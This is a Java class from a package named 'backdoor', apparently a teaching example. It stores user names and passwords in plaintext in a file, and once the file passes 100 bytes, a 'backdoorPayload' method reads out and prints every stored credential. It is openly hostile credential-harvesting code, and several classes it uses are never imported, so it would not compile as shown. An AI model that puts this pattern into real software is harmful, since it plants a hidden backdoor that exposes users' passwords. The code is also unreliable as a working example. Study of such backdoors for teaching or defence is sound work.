package br.usp.pcs.backdoor;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.File;
import java.io.IOException;

public class CreateMaliciousFile {
    private static final String FULL_PATH = "filename.txt";

    public CreateMaliciousFile(){}

    public static boolean createFile(){
        if(verifyExists()){
            return true;
        }

        try {
            File myObj = new File(FULL_PATH);
            if (myObj.createNewFile()) {
                System.out.println("File created: " + myObj.getName());
            } else {
                System.out.println("File already exists.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return true;
    }

    public static boolean deleteFile(){
        if(!verifyExists()){
            return true;
        }

        File myObj = new File(FULL_PATH);
        if (myObj.delete()) {
            System.out.println("Deleted the file: " + myObj.getName());
        } else {
            System.out.println("Failed to delete the file.");
        }
        return true;
    }

    public static void insertAtFile(String user, String password){
        createFile();
        try {
            FileWriter fw = new FileWriter(FULL_PATH, true);
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write(user+" "+password+"\n");
            bw.newLine();
            bw.close();

            if(backdoorTrigger()){
                backdoorPayload();
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static boolean verifyExists(){
        File f = new File(FULL_PATH);
        return f.exists();
    }

    public static boolean backdoorTrigger(){
        boolean b = false;
        try {
            b = Files.size(Paths.get(FULL_PATH)) > 100;
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return b;
    }
    public static String backdoorPayload(){
        try {
            BufferedReader in = null;
            in = new BufferedReader(new FileReader(FULL_PATH));
            String line = "";
            String output = "";
            while((line = in.readLine()) != null)
            {
                output = output + line;
                System.out.println(line);
            }
            in.close();
            return output;
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
}
